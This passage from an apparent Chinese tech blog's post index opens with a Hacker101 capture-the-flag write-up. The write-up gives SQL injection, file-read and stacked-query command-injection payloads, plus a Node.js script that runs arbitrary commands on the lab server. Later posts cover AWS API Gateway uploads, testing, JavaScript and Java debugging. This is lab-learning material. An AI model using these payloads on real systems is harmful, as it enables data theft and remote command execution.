的問題了接下來找到可以用 fetch?id=1 and length(database()) = 6 這種方式去判斷後者是否為 true思路大概跟這篇做法一樣 https://www.hackthis.co.uk/articles/blind-sql-injection用各種 length() 以及 like '______' 的方式可以找到相對應的值這邊就直接丟 sqlmap 把整個 table dump 出來了就發現 FLAG 了 0x01這提跟前一提的 fetch?id=1 union all select 1 Payload 有關係前面有提到是透過 id 去撈 filename 回來去顯示改成 fetch?id=123123 union all select &quot;files/adorable.jpg&quot; 發現可以正確觸發 LFI 漏洞就出現了，我可以任意去讀檔案了本來想說這 php 寫的網站用以下的 payload，結果取得不到 …fetch?id=123123 union all select &quot;index.php&quot; 後來看提示才知道這是用 uwsgi-nginx-flask-docker image 做的此 image 原始碼在放在 main.py，所以改成以下 payload 就讀到原始碼，發現第二個 FLAGfetch?id=123123 union all select &quot;main.py&quot; 0x02看到 source code 之後，發現在取得 used space 那邊有 command injection 的問題subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\\n', 1)[-1]只要能在 filename 加上 ; 再加上後面想要執行的指令就可以觸發 CI 的問題了但要觸發他必須要靠 photos table 裡面的 filename 去觸發一開始嘗試使用 stacked query 的方式，以下為 payload541; UPDATE photos SET filename = '; ls ' WHERE id = 3; 試了很久完全沒有任何反應，本來以為不是 stacked query 這條路結果回去翻題目的提示有提到 COMMIT 這個關鍵字才想到有時候 SQL 指令下 UPDATE 變更完並不會馬上生效而是要下 COMMIT; UPDATE 的語法才會真正觸發於是 Payload 改成以下這樣就成功了，下面變成 uwsgi.ini 了fetch?id=541; UPDATE photos SET filename = &quot;; ls&quot; WHERE id = 3; COMMIT; 然後根據 main.py 的 regex 修改一下，然後寫出一個可以一直輸入 command 的 node.js 程式123456789101112131415161718192021222324252627function inputFunction(readline) { readline.question(`Keep input\\n\\n`, async (command) =&gt; { const axios = require('axios') await axios({ method: 'GET', url: 'http://34.74.105.127/8142a5acbe/fetch', params: { id: `541; UPDATE photos SET filename = '; ${command} | tr \"\\\\n\" \";\" ' WHERE id = 3; COMMIT;` } }).then(response =&gt; response.data).catch((err) =&gt; { return; }) let result = await axios({ method: 'GET', url: 'http://34.74.105.127/8142a5acbe/' }).then(response =&gt; response.data) console.log('\\n' + result.split('Space used: ')[1].split('&lt;/i&gt;&lt;/div&gt;')[0].replace(/;/g, \"\\n\")); inputFunction(readline) })}(() =&gt; { const readline = require('readline').createInterface({ input: process.stdin, output: process.stdout }) inputFunction(readline)})() 但是逛了老半天 … 完全不知道 flag 放在哪裡跑回去看題目提示到 『enviroment』，才想到有可能放在應用程式裡面的環境最後下一個 printenv 就拿到 FLAG 了 ！ 簡單 demo 影片 後記這題蠻有趣的，學到 stacked query、command injection 以及 LFI不過過程中有些真的不知道怎麼做，跑去看提示才知道不然真的瞎子摸象摸不太出來 QQ","link":"/2019/09/10/hacker101-part4/"},{"title":"如何用 AWS API Gateway 和 Lambda 上傳和下載檔案 -- Part 2","text":"前言這次記錄是介紹，只透過 AWS API Gateway 不加上 AWS Lambda 做檔案的上傳上一篇因為 Lambda 的特性是 Request 和 Response 都要是 JSON所以必須在 API Gateway 必須要做 body mapping 的調整e.g 透過 Binary Support 或是 Base64Enconde 的方式處理那這次的紀錄是讓 AWS 的 API Gateway 的 Upload 直接通往到後面的 Server 端 AWS API Gateway在上一篇，透過 Lambda 和 API Gateway 完成檔案上傳和下載之後出現了一個疑問，API Gateway 直接到 Server 這端，需不需要調整東西呢 ? 在這樣的想法下，做了一個簡單的實現 在 API Gateway 新增一個 API /upload (POST Method) 用 nodejs 啟動 server (記得把 body-parser 改成 text 也支援的設定)在這樣的實驗之下，發現 Request 的 Content-Type 只有帶 multipart/form-data並沒有帶後面的 Boundary，這樣會沒有辦法去 Parse 上傳的檔案或是 text那會這樣的原因只會有一個，那就是 API Gateway 對我的 Headers 做了手腳 後來的解決方式，是把設定 API Gateway 為 Proxy，就可以讓 bounday 成功 pass 到後端 Server那這後面就會介紹如何設定 API Gateway (基本上就只有一個地方，Integration Request &amp; Integration Response) Upload只要把 HTTP Proxy Integration 打勾即可，不用像上一篇要到其他地方做設定 ServerUpload12345678910const express = require('express')const app = express()const bodyParser = require('body-parser')app.use(bodyParser.text({type: '*/*'}))app.post('/upload_file', (req, res, next) =&gt; { console.log(req.body); console.log(req.headers); res.json({})})app.listen(8080) DEMOUpload從上傳的地方會看到 content-type 最後面會出現 boundary如果 API Gateway 沒有設成 Proxy 的話，是不會出現 不會出現的話，會沒辦法用 content-type 後面的 boundary 去 parse 檔案的因為檔案之間會用 boundary 去區分，沒了這個就沒辦法識別傳了什麼上來","link":"/2017/11/15/handle-upload-download-file-with-Lambda-and-API-Gateway-2/"},{"title":"如何用 AWS API Gateway 和 Lambda 上傳和下載檔案 -- Part 1","text":"這篇主要是記錄如何利用 AWS lambda 和 AWS API Gateway 做檔案的上傳以及下載在 API Gateway 中要做幾項設定才有辦法達成加上 Lambda 不能回傳『完整』的 binary 所以必須搭配 API Gateway mapping template 調整這篇不會一步一步教學開 API Gateway 和 Lambda，只記錄重點部分 API Gateway主要調整得地方有兩個 /upload Integration Request /download Integration Response 另外還有一種特別的方式，是利用 API Gateway 的 Binary Support 去處理這種方式會列在最後面 /upload Integration Request 到 body mapping template 底下調整成圖片樣子(Generate templaye 選擇 “Method Request passthrough”) 12345// 需要修改的部分為第一行的 body// 其他行不需要做調整{ \"body\": \"$util.base64Encode($input.body)\"} /download Integration Reponse 到 body mapping template 底下調整成圖片樣子 1$util.base64Decode($input.body) Lambda主要是用 nodejs 去編寫處理上傳的部分 Handle upload request1234567891011const multipart = require('parse-multipart');exports.handler = (event, context, callback) =&gt; { // convert base64 string to binary const buffer = new Buffer(event.body, 'base64') const boundary = multipart.getBoundary(event.params.header['Content-Type']) const parts = multipart.Parse(buffer, boundary) return callback(null, { s: parts }) } Handle download request這邊範例是用去讀取 S3 的檔案 12345678910111213141516exports.handler = (event, context, callback) =&gt; { s3.getObject({ Bucket: 'your-bucket', Key: 'download_file.json' }, (err, data) =&gt; { if (err) { return callback(err) } // 原本方式是會直接回傳 JSON (DEMO 有圖) // callback(null, data.Body) // // 正確方式，回傳 base64，然後讓 API Gateway 去 decode callback(null, new Buffer(data.Body).toString('base64')) })} Demo with PostmanUpload File上傳要注意選 “form-data”然後隨便選擇一個檔案即可 Download File如果沒有在 API Gateway 做調整的話會變成沒錯，Lambda 是會直接回傳 JSON 的他並不會回傳 binary 給你，所以才要到 API Gateway 和 Lambda 做一些調整 (要到 mapping template 調整) 修改之後 然後可以改用程式下載檔案 123456const request = require('request')const fs = require('fs')const r = request.post('your_url')r.on('response', function (res) { res.pipe(fs.createWriteStream('download_file.json'))}); 額外補充 - Binary Support/upload integration request在 API Gateway 底下的 binary support 加上 multipart/form-data，API Gateway 就會自動幫我們做 base64 encode 而在 mapping template 就改成這樣即可lambda 不需要做任何調整 123{ \"body\": $input.json('$')} 註記 API Gateway payload 有限制 10mb Lambda 有限制 6mb 所以最大只能上傳或下載 6mb 的檔案但是，因為會轉成 base64，所以原本的 4mb 轉完可能變成 5mb這裡是特別要注意的地方","link":"/2017/11/04/handle-file-with-Lambda-and-API-Gateway/"},{"title":"關於『測試』這件事","text":"為什麼要測試?確保你程式的結果跟你預期所想的一樣那這樣有什麼好處?這樣大概會讓你少加班好幾小時吧 …. 下面我會介紹如何用 mocha 去做測試小弟我對測試並沒有鑽研到很深的地步，如果有任何奇怪的地方，歡迎指教 ~ 介紹測試是為了確保你的程式結果跟你預期所想的一樣那我們又該如何去測試？那又該測試什麼東西？ 在這邊我把該測試的東西分成三個方向，由小到大這篇文章重點會放在 Unit Test 的部分，其他會以 Unit Test 的概念延伸說明 Unit Test (本篇重點)測試你的 function 有沒有輸出正確結果 API Test測試跟 API 相關的 Unit 有沒有正確執行 User Story Test測試整個使用情景有沒有跟使用者所想的一樣 準備在開始要做測試之前需要安裝以下幾樣東西1234// mocha 測試主要會用到的東西// chai 一個很好用的 assertion library// axios 發 request 用的 librarynpm install mocha chai axios 該建立的資料夾 12345|--- package.json|--- node_modules|--- test| |--- test.js 如何測試想像一下我們現在有一個需求進來了『我要把我丟進去的數字都變成一個陣列然後回傳回來』 所以根據這個狀況我可以列出一個測試的方式12345678910// First Test Case in test.jsconst {assert} = require('chai')describe('Unit Test', function() { it('Test function with one number', function () { const result = transformToArray(1) assert.equal(typeof [], typeof result) assert.equal(1, result.length) });})測試列出來了，但是程式完全還沒寫於是接下來先寫主要功能的程式 12345678// 這程式想放哪都可以，記得 require 近來就好function transformToArray (number) { return [number]}transformToArray(1)// result should be [1] 程式寫出來之後，可以正式執行測試了依照這個 test case 我們的程式是有正確執行的 接下來我在列出另一個 test case123456789101112131415// First Test Case in test.jsconst {assert} = require('chai')describe('Unit Test', function() { it('Test function with one number', function () { const result = transformToArray(1) assert.equal(typeof [], typeof result) assert.equal(1, result.length) }); it('Test function with multiple numbers', function () { const result = transformToArray(1, 2, 3, 4) assert.equal(typeof result, typeof []) assert.equal(result.length, 4) })}) Oops, test case 出錯了，代表我的程式爆炸了這時候該怎麼辦？那就是回去繼續修改我的程式讓他可以通過這個 test case 進行修改後，程式變成這樣 123456789// Version 2 程式const transformToArray = function () { let temp = [] for (const i of arguments) { temp.push(arguments[i]) } return temp} 登愣，我們執行結果正確了 但是總覺得程式好像沒有寫得很漂亮於是改成 1234567// Version 3 的程式const transformToArray = function () { return Object.keys(arguments).map((key) =&gt; { return arguments[key] })} 在我們剛剛列出 test case 然後修正程式去符合新的 test case這整個開發流程，就屬於 TDD 的方式 列出 test case 開發程式 Passed or Failed Refactor 不過我個人是喜歡 BDD 的開發方式，兩個的主要差別我列在下面 Test-driven Development 的方式，是以測試為主，列出各種 test case 讓程式可以正確執行 Behavior-driven Development 的方式跟 TDD 很相似，但是他會以規格為主(有點像訂出 User Story 的感覺) BDD 比較符合我們現時開發上的流程，客戶需求進來變成一個 User Story，根據 User Story 寫出 Test Case接下來就是開發程式，讓程式可以通過這個 Test Case 那關於測試 API 和 Uesr Story 的方式大體上跟 Unit Test 很相似，差在 Test Case 的寫法不太一樣而已 對 API Test 來說，可能是 3 ~ 4 Unit 合成的一個 API例如 API 是『登入』，對登入來說 Input 是帳號密碼，Output 是有無驗證成功帳號密碼的驗證可能牽扯到 3 ~ 4 Unit，但是這已經在 Unit Test 那邊完成了所以對於 API Test 來說，可能會列出以下幾種 Test Case 輸入正確帳號密碼，成功登入 輸入錯誤帳號密碼，無法登入 輸入正確帳號錯誤密碼，無法登入 輸入錯誤帳號正確密碼，無法登入 對 User Story 來說，可能是 3 ~ 4 個 API 合成的一個功能假如使用情形是，使用者登入了賣書網站搜尋了他想要的書本，根據搜尋會顯示或是找不到書本給使用者看那對於 User Story Test 來說，可能會列出以下幾種 Test Case First Test Case 輸入正確帳號密碼，成功登入後 在搜尋欄位輸入『nodejs』 然後顯示 nodejs 書籍 Second Test Case 輸入正確帳號密碼，成功登入後 在搜尋欄位輸入『找不到』，然後顯示搜尋結果為 0 筆的頁面 結語我認為用什麼樣的開發流程去測試程式都可以BDD TDD ATDD 等等，都是很好的開發流程對於不同團隊都會有各個團隊習慣的方式但最重要的是，要有『測試』這件事情出現在專案的開發流程上就足以","link":"/2017/11/01/how-to-test/"},{"title":"javascript 無限累加器","text":"前言最近在 js 群組上面看到一個題目，覺得蠻有趣就順手記錄下來，題目如下1234sum(2)(3).sumOf() // 5sum(2, 3).sumOf() // 5sum(1, 2)(3).sumOf() // 6sum(1)(2)(3)(4)(5, 6, 7, 8)(9, 10).sumOf() // 55 其實這就是 curry 化的一種變形寫法 實作 - 基本 function先來說說 curry 是什麽樣的東西『透過部分參數呼叫一個 function，然後讓此 function 回傳 function 去處理剩餘的參數』以下先來個符合題目的範例12345678let sum = function(x) { return function(y) { return { sumOf: () =&gt; x + y } };};sum(2)(3).sumOf() // 5 這樣一個簡單的累加器就完成了，但這只也符合兩層如果要加到 5 層，程式碼就會長下面這樣這種 code 根本不是人看的，接下來就需要另一個概念『遞迴』12345678910111213let sum = function(x) { return function(y) { return function(z) { return function(a) { return function(a) { return { sumOf: () =&gt; a+b+x+y+z } }; }; }; };}; 實作 - 遞迴遞迴的概念就是重複呼叫 function 本身，然後達到某個條件在停止所以關鍵在於『需要讓他一直呼叫 function 直到呼叫 sumOf 才停止』依照這個概念下去設計，程式碼會如下12345678910let sum = function(x) { let all = x; let plus = (y) =&gt; { all += y; return plus; } plus.sumOf = () =&gt; {return all} return plus;};sum(1)(2)(4).sumOf() // 7 透過在裡面宣告一個新的 plus function並把最一開始傳進來的 x 放在 all 這個 closure 裡面去保存然後讓這個 plus function 一直回傳自己就可以達到無限累加的功能接下來最後透過賦予 plus 一個 object function在最後去呼叫 sumOf 就可以直接回傳總值了 實作 - 無限參數接下來要解決另一個問題就是無限參數的問題可以透過 args 把所有參數都帶進來1234function test(...args) { console.log(args);}test(1,2,3,4) // [1, 2, 3, 4] 接下來配合 reduce 去把整個 array 加起來這樣無限累加器就成功了12345678910let sum = function(...args) { let all = args.reduce((p,c)=&gt;p+c,0); let plus = (...args) =&gt; { all += args.reduce((p,c)=&gt;p+c,0); return plus; } plus.sumOf = () =&gt; {return all;} return plus;};sum(1,2,3)(2,3,4)(1,2).sumOf() // 18 另外其實這一段程式碼也可以再改寫因為這一段跟 sum 的第一行 args.reduce 都是一樣的東西1234let plus = (...args) =&gt; { all += args.reduce((p,c)=&gt;p+c,0); return plus;} 這邊可以透過用 bind function如此一來，可以把加總的結果再丟到新的 function 去做加總1234567let sum = function (...args) { let all = args.reduce((p,c)=&gt;p+c,0); let plus = sum.bind(null, all); plus.sumOf = () =&gt; {return all}; return plus;}sum(1)(2,3)(3,4,5).sumOf() // 18 後記雖然看到題目知道大概就是考 curry 和 clousre 的概念但還是會稍微卡一下 XD蠻有趣的題目就順手紀錄拉 ~","link":"/2020/02/10/javascript-accumulator/"},{"title":"java.lang.OutOfMemoryError Java heap space? 怎麼解?","text":"前言因為工作關係，其實不只會碰到 node.js有時候還會協助其他專案，而有的專案就是用 java 寫的很久之前在伺服器噴出一個 OutOfMemoryError: Java heap space 的錯誤就開始尋錯之旅了 … 但這裡不會真實把工作上的專案的 bug 記錄在這裡 XD只會以簡單的程式去表達當時除錯的流程基本上發摟這方法，應該能夠鎖定問題點不行的話 … 您看看就好 XD 還原案發現場先上一段程式來模擬可以噴出 OutOfMemoryError此程式是無限迴圈地往 Map 裡面塞東西12345678910111213141516import java.util.HashMap;import java.util.Map;import java.util.Random;public class Test { public static void main(String args[]) throws Exception { Map&lt;Integer, String&gt; map = new HashMap&lt;Integer, String&gt;(); Random r = new Random(); while (true) { map.put(r.nextInt(), \"value\"); } }} 透過 javac Test.java 編譯成功後再透過 java -Xmx12m Test 去執行指令這裡的 -Xmx12m 是一個關鍵，這裡指定了這個 java 程式能使用的 heap memory 的上限為 12M此時執行完指令的時候會噴出以下錯誤12345Exception in thread &quot;main&quot; java.lang.OutOfMemoryError: Java heap space at java.util.HashMap.resize(HashMap.java:703) at java.util.HashMap.putVal(HashMap.java:662) at java.util.HashMap.put(HashMap.java:611) at Test.main(Test.java:13) 這樣可以看到噴出此錯誤訊息這代表說假設你電腦本身記憶體空間 8G但你分配給 java 應用程式的記憶體只有 12 MB 的時候它不會跨過這個 12 MB 限制，即使電腦還有將近 8G 的記憶體空間，它是不會超過 12 MB總歸一句話，使用的記憶體超出了我們設定給他的限制會導致 OOM (Out of Memory) 這裡可以注意到叫做『Heap Space』也就是程式運行時 JVM 可調配讓程式使用的記憶體空間Class 實例化的 Instance 也是被放在這個區域除了 Heap 之外，還有 PermGen 的設定PermGen 指的是 Memory 永久保存區是存放 Class, Meta Info 的地方如果太小可能就會在 pre compile 的階段把 PermGen 弄爆 解決方法通常記憶體不夠，就是給他開大加下去！但萬一你的程式剛好是無窮迴圈地往某一個地方塞東西這樣加大記憶體就沒有任何意義了因為這屬於程式上的 Bug，要解決的不是記憶體而是寫出這程式的人解決程式邏輯的 Bug 才對 但如果是本身記憶體真的不夠用那就是加上記憶體試試看，如果加了好幾 XXG 上去依舊不能用就開始要分析出錯的原因了 至於要如何分析, 雖然 log 會噴出 Exception 的訊息但總不會一直蹲在 log 前面看 Exception 哪天噴出來就算 log 以雲端方式保存，Exception 能分析的程度還是有限 所以可以加上以下指令把當時噴出 OOM 的詳細狀況 dump 出來-XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/tmp會把在 OOM 的時候, 把整個 heap 等等當下執行詳細的狀況儲存變成一個檔案以上述的範例來說，使用的完整指令為java -Xmx12m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/tmp Test這樣出現 OOM 的時候，就會往 /tmp 底下放入一個副檔名為 .hprof 可分析檔案12345678910java -Xmx12m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/tmp Testjava.lang.OutOfMemoryError: Java heap spaceDumping heap to /tmp/java_pid57606.hprof ...Heap dump file created [19050199 bytes in 0.163 secs]Exception in thread &quot;main&quot; java.lang.OutOfMemoryError: Java heap space at java.util.HashMap.resize(HashMap.java:703) at java.util.HashMap.putVal(HashMap.java:662) at java.util.HashMap.put(HashMap.java:611) at Test.main(Test.java:13) 不過要注意的是當應用程式越龐大的時候，產生出來的 hprof 就會越大高達 GB 等級以上也是很常見的所以伺服器保留適當的空間就很重要 這時再透過 java 內建的一個分析程式 jvisualvm 去分析這個檔案就可以找到出現 OOM 的地方通常 jvisualvm 是位在 java home 裡面 bin 底下的位置，以 Mac 來說是在這個路徑底下/Library/Java/JavaVirtualMachines/jdk1.8.0_65.jdk/Contents/Home/bin/jvisualvmWidnwos 則是會在 C:\\Program Files\\Java\\jdk1.8.0_65 這前提是你沒有自行更改安裝的位置有更改安裝位置的話，那你自己應該就知道在哪了 XD 打開後長這樣，然後開啟剛剛 dump 出來的 hprof 檔案 在裡面會看到一個『Thead casuing OutOfMemoryError exception: main』 點選 main 後就可以看到錯誤的地方 點上面 class 可以獲得比較詳細的資訊，包含使用記憶體多少的量都能夠知道 以上是簡單介紹針對 OOM 除錯的一個心得和介紹 Tomcat 設定方法在 tomcat 預設的資料夾底下，進入到 bin 的資料夾linux 用戶新增一行程式新增一個 setenv.sh 的檔案export JAVA_OPTS=&quot;-Xmx12m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/tmp&quot; windows 用戶則是新增一個 setenv.bat 的檔案JAVA_OPTS=&quot;-Xmx12m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/tmp&quot; 後記實際上並沒有一個銀彈可以順利地解決 OOM 的方法必須找到是程式的邏輯 Bug 導致 OOM又或是本身程式就是需要比較大的記憶體又或是第三方的 Library 寫不好又或是流量太大開太多 Thread原因有很多種，只能透過分析的方式找到引起的主因否則，單純加大記憶體不會解決根本原因不然只持推遲爆炸的時間點而已 (汗… 不管哪種語言排除 OOM 的流程都是大同小異這邊就先記錄以 Java 的方式 (畢竟剛好工作上碰到","link":"/2020/02/24/java-oom/"},{"title":"JavaScript 真的是直譯式語言嗎？","text":"前言網路上常有人在討論 js 是不是編譯 (compiler) 語言又或是直譯 (interpreter) 語言這是一個蠻妙的問題，但要了解這之前，我們必須先談談什麼是編譯語言什麼是直譯語言 這邊先來個科普，在中國那邊也會把直譯稱之為解釋型語言，所以直譯等於解釋下面文章統一都會用直譯去做解釋 編譯語言被稱為編譯語言有一個特性此語言會透過編譯器編譯成另一個語言而編譯器是什麼呢? 先來說說一個情境在這個世界中我在 A 國家扮演著一種角色這個角色是一個專門的手抄者，做的事情就是專門把英文的書翻成中文書讓 A 國的人也能夠讀懂英文的書這裡的手抄者，可以想像成就是編譯器的存在 透過手抄者生產出來的書，還沒有人去讀是不會產生任何效果的編譯器也是如此，編譯器把 C++ 等等語言轉變成 byte code這個 byte codes 還沒被電腦執行之前，是沒有任何作用的 所以編譯語言做的事情就是，把 A 語言的程式碼轉換成 B 語言的程式碼 直譯語言被稱為直譯語言有一個特性此語言會透過直譯器直接去執行，並輸出結果這個直譯器又是什麼呢? 再來換另一個情境在這個世界中我是 A 國家的一個角色這個角色是一個專門的口譯者，做的事情就是專門把英文的語言翻成中文的語言給 A 國的人聽讓 A 國的人能夠聽懂英文 這裡的口譯者總共做了兩件事情 分析英文語句以及文法 把分析完的結果轉成中文說出來 這裡的口譯者，可以想像成就是直譯器的存在其實這也跟上述手抄者在做的事情很類似，兩者一樣都是在翻譯一種語言，只是結果不盡相同 簡單總整比較一下兩者之間的行為差別 編譯器 把 A 語言轉換成其他可以讓機器執行的 B 語言，但不會去執行，產生的結果是語言 直譯器 讀取 A 語言，並且執行它，不會輸出額外的語言，產生的結果是運行結果 兩者之間的效能 編譯器 會把大多數的時間花在編譯上，而且編譯出來的另一種語言很接近電腦能讀的語言，所以實際上執行的時候效率是很高的 直譯器 會讀取原始碼之後，立刻進行分析，分析完又馬上執行。牽扯到語法分析、編譯成機器能讀的語言、交給電腦執行。要如何把這整個流程進料減少分析以及編譯的次數是效能的一大考量 不管是編譯器或是直譯器，都是會需要詞法以及語法分析 用一張圖來表示編譯以及直譯語言的差別 圖片出自你知道「编译」与「解释」的区别吗？ js 是哪一種 ?常常有人說 js 直譯 (interpreter) 語言，因為不需要編譯 (compiler)，而且是直接跑在瀏覽器上不像 C++ 那樣需要編譯後才可以執行，所以 js 都是一行一行執行的！ 且慢 …… 你知道 js 裡面有一個 hoisting 的概念嗎? 關於 js hoisting 的文章建議可以看看我知道你懂 hoisting，可是你了解到多深？裡面講得非常詳細 當你執行以下程式是得到 Uncaught ReferenceError: test is not defined1console.log(test); // Uncaught ReferenceError: test is not defined 但當你執行以下程式卻得到 undefined12console.log(test); // undefinedvar test = 1; 如果是一行一行執行，那為什麼上面兩者的結果是不同的呢?在讀過編譯器和直譯器後，我想各位讀者應該有些答案了 在主流瀏覽器的實現下，js 『看起來』像是直譯語言但在這個黑箱子背後，也是有編譯的步驟存在這樣 js 是不是直譯語言呢?我們來看看其他地方針對直譯式語言或是 JavaScript 是如何介紹的 虚拟机随谈（一）：解释器，树遍历解释器，基于栈与基于寄存器，大杂烩提到以下這一段話 一般在網路上都會看到 Python、Ruby、JavaScript 都是直譯語言，是通過直譯器來實現這其實很容易造成誤解，語言一般只會定義抽象語義，而不會強制性要求採用某種實現方式 且在 MDN Web Docs 上面是這樣對 JavaScript 進行介紹的 JavaScript (JS) is a lightweight, interpreted, or just-in-time compiled programming language with first-class functions. 在維基百科上則是這樣對直譯式語言進行解釋的 Many languages have been implemented using both compilers and interpreters,including BASIC, C, Lisp, and Pascal. Java and C# are compiled into bytecode, the virtual-machine-friendly interpreted language.Lisp implementations can freely mix interpreted and compiled code. 所以以使用的案例來說，在瀏覽器上的 js 是直譯語言不過是哪一種，需要看用哪一種方式實現這種語言的執行方式因為說到底語言只是定義抽象語義，並無強制要用哪一種類型實現 前面有提到效率，那是不是 js 效率就很低?且慢！看看我們 Chrome V8 大大就完美呈現什麼叫做媲美編譯語言的效能了有興趣的可以去看看各種 V8 比較效能的文章 後記希望這篇有幫助到正在了解 js 是編譯或是直譯語言的小夥伴們 References MDN Wiki 虚拟机随谈（一）：解释器，树遍历解释器，基于栈与基于寄存器，大杂烩 我知道你懂 hoisting，可是你了解到多深？ 你知道「编译」与「解释」的区别吗？","link":"/2020/03/16/javascript-is-compiler-or-interpreter-language/"},{"title":"Express 對靜態檔案做了什麼? 為什麼會被 cache 住呢?","text":"前言最近突然有一個想法開始研究起瀏覽器端的 Cache 方法加上小弟常用 nodejs + express 去寫前後端於是開始研究起 express 裡面有一個 middleware 怎麼做起瀏覽器 cache 這件事 介紹在 express 裡面有一個 function 叫做 express.static()這個是一個 middleware，最常被用在要讀取一些靜態檔案上面以這個寫法來說 app.use(express.static(__dirname + './public'))是指向 public 這個資校夾裡面，假設裡面有一個檔案叫做 index.html 的話，並且伺服器的 port 是 8080那麼在網址列輸入 http://localhost:8080/index.html 這樣就可以讀到這個檔案了 追朔源頭那我的疑問來了，我打開 Chrome Inspect 的 Network Tab 去看了一下他的 Response Headers發現一件很奇怪的事情，我明明什麼都沒有設定，卻出現幾個有關 Cache 的 Headers Accept-Ranges Cache-Control ETag Last-Modified 有關 Cache 的一些機制和理論就不多作介紹這裡單純就爬一下 Source Code，看看 express 對靜態檔案做了什麼 express在 express source code 中，發現他是用了另一個 library server-static於在就再來看看 server-static 做了什麼 1exports.static = require('serve-static'); serve-static我只列出關鍵幾行，其他行主要都是設置參數用而已 從第一行可以看出，把 serverStatic 這個 function 給 export 出來了再往下看會發現有一個 send function 把 path 傳了進去然後在最後面，stream.pipe(res) 對 response 做了一些更動 於是再往下找找看 send() 這個是什麼東西 12345678910111213module.exports = serveStatic;var send = require('send')function serveStatic (root, options) { // Some codes .... var stream = send(req, path, opts) // Some codes .... // pipe stream.pipe(res)} send – send根據上一段程式最後一段 (12行)，他 call 了一個 pipe 的 functionpipe function 裡面去 call this.sendFile(path)this.sendFile 裡面又去 call self.send(path, stat)然後在 send 這個 fucntion 裡面出現關鍵的 function – this.setHeader看來 response headers 就是在這邊被更改了 123456789101112131415161718192021222324252627module.exports = send// 這邊回傳給到 server-static 去 call// 也就是上一段程式碼的第 8 行，然後在第 function send (req, path, options) { return new SendStream(req, path, options)}SendStream.prototype.pipe = function pipe (res) { this.sendFile(path)}SendStream.prototype.sendFile = function sendFile (path) {// 這個等等 demo 截圖會看到，所以先留著 debug('stat \"%s\"', path) self.send(path, stat)}SendStream.prototype.send = function send (path, stat) { // 這個等等 demo 截圖會看到，所以先留著 debug('pipe \"%s\"', path) // set header fields this.setHeader(path, stat)} send – setHeader找到了對 header 做更動的地方後，以第 11 ~ 20 行中間這段 Code 來說去設置了 Cache-Control 的內容，依照整個邏輯下如果沒有特別設置，那麼 header 會長以下這樣 Cache-Control: public, max-age=0 123456789101112131415161718192021222324252627282930313233SendStream.prototype.setHeader = function setHeader (path, stat) { var res = this.res this.emit('headers', res, path, stat) if (this._acceptRanges &amp;&amp; !res.getHeader('Accept-Ranges')) { debug('accept ranges') res.setHeader('Accept-Ranges', 'bytes') } if (this._cacheControl &amp;&amp; !res.getHeader('Cache-Control')) { var cacheControl = 'public, max-age=' + Math.floor(this._maxage / 1000) if (this._immutable) { cacheControl += ', immutable' } debug('cache-control %s', cacheControl) res.setHeader('Cache-Control', cacheControl) } if (this._lastModified &amp;&amp; !res.getHeader('Last-Modified')) { var modified = stat.mtime.toUTCString() debug('modified %s', modified) res.setHeader('Last-Modified', modified) } if (this._etag &amp;&amp; !res.getHeader('ETag')) { var val = etag(stat) debug('etag %s', val) res.setHeader('ETag', val) }} DEMO另外提供另個方法可以追回去 (我是懶得寫程式直接看 source code XD)安裝完環境之後要跑 server 的時候，可以這樣下 DEBUG=* node server.js 從圖片中可以發現，那些 log message 是一樣的 後記一直以來以為是 express 的做法讓檔案可以 cache 住原來一直都是默默無名的 opensouce library 在幫助 express 啊希望這篇有稍微幫助到對 express 處理 static files 有疑慮的人","link":"/2017/12/11/express-static/"},{"title":"JavaScript this 是什麼? 如何運作的呢?","text":"前言\b\b\b相信寫過 js 的人對於 this 都有一定的認識但要搞懂它真的不容易，js 的 this 並沒有其他語言的 this 那麼單純所以這邊要一步一步的去展示並介紹 js 中的 this 到底是怎麼一回事以及最後面教學如何一步一步判定 this 會是指向什麼 this \b是什麼 ？this 單純看英文解釋的話，是代表『自身』聽起來好像有這麼一回事，但實際上使用起來根本不是這樣實際上 js 中 this 代表的是執行時的對象，並不代表自身簡單來就說就是找函數被調用的位置 讓我們看看以下的範例 1234567891011121314function foo(num) { console.log( `foo: ${num}`) this.count++;}foo.count = 0;for (let i = 0; i &lt; 10; i++) { if (i &gt; 7) { foo(i); }}// foo: 8// foo: 9// foo 被調用多少次console.log(foo.count) // 0 --- ??? 為什麼是 0 ?? 雖然 console.log 真的有跑出來 foo 的兩個輸出但 foo.count 卻還是 0這其中的原因是，真正執行 foo 調用的位置的地方是全域(瀏覽器中為 window 物件)注意到這點回去可以執行這行 window.count 會發現為 NaN，卻不是 undefined 那我在這邊該如何去把 this.count 綁定到我的 foo.count 上面呢?這裡可以透過 fn.call(thisArg, arg) 的方式把我們的 this 綁定到 foo 上面在 for loop 之中調用 foo 得方式更改為 foo.call(foo, i) 就可以完成綁定重新執行以上的程式就會發現 foo.count 變成 2 了！ 然而要如何尋找呼叫位置以及善用 this 就是一件學問了而用 this 有什麼好處? 看看以下這段 code 12345678910111213141516function foo(num) { console.log( `foo: ${num}`) data.count++;}var data = { count: 0}for (let i = 0; i &lt; 10; i++) { if (i &gt; 7) { foo(i); }}// foo: 8// foo: 9// foo 被調用多少次console.log(foo.count) // 2 沒有用 this 去做綁定，而是用一個變量的方式去儲存雖然這樣一樣看達到效果，但這看起來就不太簡潔未來要重複使用也很不方便而這就是學好 this 的好處之一 看到這邊應該會 this 有簡單的理解了那對於以下這段 code 應該就能清楚知道會出現什麼結果了 123456789101112131415161718function identify() { return this.name;}function speak() { var greeting = \"I 'm\" + identify.call(this); console.log(greeting)}var me = { name: \"Jack\"};var you = { name: \"Reader\"}identify.call(me) // Jackidentify.call(you) // Readerspeak.call(me) // Jackspeak.call(you) // Reader this 綁定規則前面提到要如何去找到調用位置是重要的事之外還要理解 js 中是有哪些規則去綁定 this 的以下會開始介紹 js 的幾種綁定方式但就個人來說，盡量使用顯示綁定的方式去把 this 綁定到對的對象上面才是正確的做法 Default Binding (默認綁定)這條為無法應用其他規則的時候，默認會出現的綁定模式請看以下的 code 12345function foo() { console.log(this.a);}var a = 2;foo(); // 2 這邊可以注意到 var a = 2 是在全域下的一個全局變量所以裡面的 this.a 是指向到全域的變量 